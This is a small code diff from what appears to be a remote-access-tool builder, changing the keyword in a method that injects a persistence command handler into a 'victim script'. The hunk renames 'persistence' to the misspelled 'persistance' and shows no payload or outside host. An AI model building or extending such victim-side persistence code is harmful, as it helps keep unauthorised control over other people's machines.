@@ -1235,7 +1235,7 @@ class OptionsPage(CenteredFrame):
 
     def add_persistence_code_to_victim_script(self):
         persistence_code = """
-            elif command.strip() == "persistence":
+            elif command.strip() == "persistance":
                 response = add_persistence()
                 sending(response)
                 continue
